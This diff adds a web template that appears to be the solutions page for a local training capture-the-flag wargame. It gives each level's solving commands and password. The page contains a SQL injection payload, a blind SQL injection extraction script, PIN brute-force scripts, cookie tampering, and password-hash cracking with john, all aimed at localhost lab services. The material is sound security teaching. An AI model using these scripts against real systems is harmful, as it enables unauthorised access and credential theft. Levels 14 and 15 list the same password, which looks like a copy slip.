@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<% include ../partials/head %>
+<body>
+
+<!-- Navbar -->
+<% include ../partials/navbar %>
+
+<!-- Sidebar -->
+<% include ../partials/sidebar %>
+
+<!-- Overlay effect when opening sidebar on small screens -->
+<div class="w3-overlay w3-hide-large" onclick="w3_close()" style="cursor:pointer" title="close side menu" id="myOverlay"></div>
+
+<!-- Main content: shift it to the right by 250 pixels when the sidebar is visible -->
+<div class="w3-main" style="margin-left:250px">
+
+  <div class="w3-row w3-padding-own">
+    <div class="w3-twothird w3-container">
+      <h1 class="w3-text-teal"><%= title %></h1>
+    </div>
+  </div>
+
+  <div class="w3-row">
+    <div class="w3-twothird w3-container">
+
+  <%switch (num) {
+    case "0":%>
+      <h2 id="level0">Level 0</h2>
+
+      <p>Special characters need to be escaped. Often "-" means stdin.</p>
+
+      <pre><code class="bash language-bash w3-codespan">cat ./-</code></pre>
+
+      <p><strong>Password:</strong> VeDfwE6aEbxAHXANbr79RBySgojiAJAS</p>
+
+    <% break;
+    case "1":%>
+      <h2 id="level1">Level 1</h2>
+
+      <p>Find is a powerful tool and has a lot of options to specify the search. Some of them are shown here:</p>
+
+<pre><code class="bash language-bash w3-codespan">find / -user ctf1 -size 21529138c   | grep passwords.txt
+#or
+find passwords.txt / -user ctf1 -size 21529138c | grep passwords.txt
+#and
+cat /usr/share/dict/passwords.txt | grep ctf2
+</code></pre>
+
+      <p><strong>Password:</strong> aZG7eBfPp3LM4SfBU7Mor2UiDhYoyJYg</p>
+      
+    <% break;
+    case "2":%> 
+      <h2 id="level2">Level 2</h2>
+
+      <p>The cat commands even reads binary files some editors don't. To find out what file type you are dealing with use file. Then you can decide what to use next. A       good way is to try some encoding formats like hex, base64 or rot13.</p>
+
+<pre><code class="bash language-bash w3-codespan">file pw.bin
+cat pw.bin | base64 --decode
+#or
+cat pw.bin | base64 -d
+</code></pre>
+
+      <p><strong>Password:</strong> hUcitUm59Gdwu6y6fHLXEURR9AQ6jHsf</p>
+      
+    <% break;
+    case "3":%> 
+      <h2 id="level3">Level 3</h2>
+
+      <p>The program only uses a 4 digit pin to protect the password. So it is easy to crack it for modern computers. But it's a tedious task. So just write a small       script to solve this. Keep track of the output. By the way: Its also able to reverse-engineer the program or use gdb.</p>
+
+<pre><code class="bash language-bash w3-codespan">#!/bin/bash
+s1="Sorry you typed the worng pin."
+
+for i in {0000..9999}
+do
+    echo $i;
+    OUTPUT="$(./PW-Safe "-s" "ctf4" $i)"
+    echo "${OUTPUT}"
+    if [ "$OUTPUT" != "$s1" ]
+    then
+        echo "Found it"
+        break
+    fi
+done
+</code></pre>
+
+      <p><strong>PIN:</strong> 4242</p>
+
+      <p><strong>Password:</strong> PkqzfT6SRYzNCLj77qvzAoncJM9CDzpb</p>
+
+    <% break;
+    case "4":%> 
+      <h2 id="level4">Level 4</h2>
+
+      <p>Git is a common version control (VC) system that's widely used. Developers can work together on the same code and then merge their changes together. It      prevents code loss and accidental deletion. It also tracks who did what and when sombody changed somthing. But not everything should be available on public git repository. Compiled code and personal and system specific preferences should be ignored. Just like credentials like logins. When they end IP in git its not enough to just delete     them.</p>
+
+      <p>So keep track what you push and what's in your .gitignore. It's a common flow to push sensitive data by mistake.</p>
+
+<pre><code class="bash language-bash w3-codespan">tar -xzf Game.tar.gz
+cd SpaceShooter
+git branch
+git checkout ServerConnection
+git log
+git show 7dde2446b43bfbad43efd06009528bd3811b3b70 or 
+git show 7df671a13d760baae17faa6200f96749872021fe
+</code></pre>
+
+      <p><strong>Password:</strong> mLAih7m22xUmQw8gHcnKoDMPExyUjoL4</p>
+
+    <% break;
+    case "5":%> 
+      <h2 id="level5">Level 5</h2>
+
+      <p>An easy way to offer a ssh server and prevent some users to log in via ssh is to just instantly log them off again. This is not a good idea.</p>
+
+      <p>Once someone is on another system even for milliseconds he can do damage. While logging in someone already can send commands:</p>
+
+  <pre><code class="bash language-bash w3-codespan">ssh -t ctf5@localhost "ls -la"
+  ssh -t ctf5@localhost "cat ReadMe" | base64 -d
+  </code></pre>
+
+      <p>The encoding just prevents find or search tools to immediately find keywords like "password" but don't offer effective security.</p>
+
+      <p><strong>Password:</strong> 2tQBHR9FW2uMbWvxSSokvGxGvehsSEFM</p>
+
+    <% break;
+    case "6":%> 
+      <h2 id="level6">Level 6</h2>
+
+      <p>Just explore the features of your browser.</p>
+
+      <p>Login to the level. <br />
+      Did you ever heard from DevTools? Thats it. Just press F12 and read the HTML</p>
+      
+      <p><strong>Password:</strong> f6pJCsjoPLjd7vSFZFaHqxe9cJ3iJvX5</p>
+      
+    <% break;
+    case "7":%> 
+      <h2 id="level7">Level 7</h2>
+      
+      <p>This is a bad example of how not to handle WebSessions with authentification.</p>
+      
+      <p>Login to the level. <br />
+      Press F12. Go to Webstorage. <br />
+      Change the Value of the cookie logedin from 0 to 1</p>
+      
+      <p><strong>Password:</strong> Js9VryWFHbVRkti9RRzHaJT9Ht2hHAi3</p>
+      
+    <% break;
+    case "8":%> 
+      <h2 id="level8">Level 8</h2>
+      
+      <p>Every http header is easy to modify and can be faked. There are a lot of tools out there for this. These tools are used to test and attack websites.</p>
+      
+      <p>Postman:</p>
+      
+      <ul>
+      <li>Open postman</li>
+      
+      <li>Send a request to http://localhost:8000/ctf/ctf8 (or IP/ctf/ctf8)</li>
+      
+      <li>Should see a response with not authorized.</li>
+      
+      <li>Open bowser and log in with ctf8 and the password</li>
+      
+      <li>Open DevTools and copy the Cookie Auth to Postman</li>
+      
+      <li>Resend reqest</li>
+      
+      <li>Now fake user-agent by filling adding this field to the header:</li>
+      
+      <li>User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4<em>3</em>3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/      6533.18.5</li>
+      
+      <li>Resent reqest</li>
+      </ul>
+
+      <p>FireFox:</p>
+
+      <ul>
+      <li>Install the addon User-Agent Switcher and Manager</li>
+      
+      <li>Go to the level site and log in</li>
+      
+      <li>Use the addon to pretent to be an IPhone</li>
+      
+      <li>You might have to disable javascript in the about:config</li>
+      </ul>
+
+      <p><strong>Password:</strong> SCZ4Ujm6fdoEnW4FejSt3v2kTcLh72VE</p>
+
+    <% break;
+    case "9":%> 
+      <h2 id="level09">Level 09</h2>
+
+      <p>To protect sensitive information just with an pin is not a good idea. With some simple script you can crack thin pin in seconds</p>
+
+      <pre><code class="Python language-Python">
+      import time
+      import requests
+      import string
+      
+      
+      cookies = {'Auth':      'KEY'}
+      
+      for i in range(0000,9999):
+          Data = {'text' : i}
+          r = requests.post('http://localhost:8000/ctf/ctf9', data=Data,
+              cookies=cookies)
+          if('WRONG' in r.text):
+              continue
+          else:
+              print(r.text)
+              print(i)
+              break
+      </code></pre>
+
+      <p><strong>Password:</strong> D2g8okMqFaGJbt7aG6MEPM9LoLbKfemr</p>
+
+    <% break;
+    case "10":%> 
+      <h2 id="level10">Level 10</h2>
+
+      <p>Text boxes where the user can enter somthing is always dangerous. They can type everything. If they type a command and the user input is not serialized than      the service will run the command. In this case a SQL command.</p>
+
+<pre><code class="SQL language-SQL">;SELECT * FROM Data
+--F3 search for ctf
+--or
+;SELECT * FROM Data WHERE user LIKE "ctf%"
+</code></pre>
+
+      <p><strong>Password:</strong> BaFm2uW3PHdcUyB8Tc2MUc2efWxFU4S4</p>
+
+    <% break;
+    case "11":%> 
+      <h2 id="level11">Level 11</h2>
+
+      <p>Similar to last level. But this time the DB-Query result is not directly showed on the page. We get a binary answer: YES the user exists or NO the user does       not exists (or invalid query).</p>
+
+      <p>But again we can manipulate the query and from the source code we know how the query and DB schema looks like. So we can gerarate a couple of questions that tells us if the password has an "a" in it or a "b" and so on ...</p>
+
+      <p>This python script generates the right passowrt just by asking quertions:</p>
+
+      <pre><code class="Python language-Python">
+      import time
+      import requests
+      import string
+      
+      
+      charset = ''.join(sorted(string.digits + string.ascii_letters))
+      neededchars = ''
+      password = ''
+      
+      cookies = {'Auth':      'KEY'}
+      
+      for c in charset:
+          Data = {'text' : 'ctf12" and pw LIKE BINARY "%' + c + '%" #'}
+          r = requests.post('http://localhost:8000/ctf/ctf11', data=Data,
+              cookies=cookies)
+          if('YAY' in r.text):
+              neededchars = neededchars + c
+              print(neededchars)
+          # time.sleep(1)
+      
+      
+      print(neededchars)
+      for i in range(0,32):
+          # time.sleep(1)
+          for char in neededchars:
+              Data = {'text' : 'ctf12" and pw LIKE BINARY "' + password + char + '%" #'}
+              r = requests.post('http://localhost:8000/ctf/ctf11', data=Data,
+                  cookies=cookies)
+              if 'YAY' in r.text :
+                  password = password + char
+                  print(password)
+                  break
+      
+      print(password)
+      </code></pre>
+
+      <p><strong>Password:</strong> me9VaFFEWatXuLk9xyYB6NzkUqEWwJhv</p>
+
+    <% break;
+    case "12":%> 
+      <h2 id="level12">Level 12</h2>
+
+      <p>The executable <em>Server</em> starts a socket on the given port. Use a port that is not reserved for special services. (Like SSH uses 22, Websites 80 and DNS 5353).</p>
+      
+      <p>Now the server is listening on that port and you can send a request. Webrequests will not work but on Linux there is the 'nc' aka 'ncat' command. Its called the "Swiss army knife of networking" because you can do almost everything with it. You can send commands, transfer files or listen on a port.</p>
+      
+<pre><code class="bash language-bash w3-codespan">./Server 6001
+#In new terminal
+ncat localhost 6001
+Hi
+#or
+nc localhost 6001
+Hi
+</code></pre>
+      
+      <p><strong>Password:</strong> oUA2NA3FiFbnj47BRJmztuaffL8nDbAL</p>
+      
+    <% break;
+    case "13":%>
+    <h2 id="level13">Level 13</h2>
+
+      <p>The tool "john" is one of the most powerful passwortcracking tools out there. Its used to crack passwordfiles wifi passowrds and alot more.</p>
+
+      <p>The first step is to extrackt the passowrd hash out of your encrypted file. There are alot of small helpers for that in john. Like <em>rar2john</em>,   <em>keepass2john</em> and lots of others.</p>
+
+      <p>Next you will can break the hash with <em>john</em> a good wordlist is essential for improved processing time. In this example there are just some small wordlists.</p>
+
+<pre><code class="bash language-bash w3-codespan">#Extract the hash in a file
+./john/zip2john pw.zip &gt; pw.zip.hash
+#Break the hash
+./john/john --wordlist=wordlists/passwords.txt pw.zip.hash
+</code></pre>
+
+      <p><strong>Password:</strong> d28YjxxCrhkmw4mTosy4P2hmCWUcPEaB</p>
+    <% break;
+    case "14":%>
+      <h2 id="level14">Level 14</h2>
+
+      <p>Steganography is the technieque to hide data in other files. Often normal pictures or music is used to hide the secred information. There are some tools out there to detect if a picture das hidden data in it. In this example its just one picture protected with a password.</p>
+
+      <p>The user also have to use the ssh-key to login to the next level. So there is no passowrd and it shows how powerful ssh-keys are.</p>
+
+<pre><code class="bash language-bash w3-codespan">#Get th os name
+#Get th os name
+hostname
+#Get the file form the pic
+steghide extract -sf hack_this.jpg
+#Change permission
+chmod 700 tatu-key-ecdsa
+#Connect to the next level
+ssh -i tatu-key-ecdsa ctf15@localhost
+</code></pre>
+
+      <p><strong>Password:</strong> 6E8Wmjx7DjkVixD4whK9NRNnUsfHY98p</p>
+    <% break;
+    case "15":%>
+      <h2 id="level15">Level 15</h2>
+
+      <p>Nmap is one of the most powerful networktool out there. It can detect open ports on a given IP and shows the running services. This shows on wich ports your system can be accsessed by the outer world. The tool is used by attacers and admins to find out what is running on the system. <br />namp is often used in scripts with various IPs to scan large networks</p>
+
+<pre><code class="bash language-bash w3-codespan">#Scan to network
+nmap -p 1-65535 localhost
+</code></pre>
+
+      <p><strong>Password:</strong> 6E8Wmjx7DjkVixD4whK9NRNnUsfHY98p</p>
+    <% break;
+    default: %><h3>Nothing more here yet.<br></h3> <%
+
+    }%>
+
+    </div>
+  </div>  
+
+  <!-- Footer -->
+  <% include ../partials/footer %>
+
+<!-- END MAIN -->
+</div>
+
+
+<!-- Scripts -->
+<% include ../partials/scripts %>
+
+</body>
+</html>
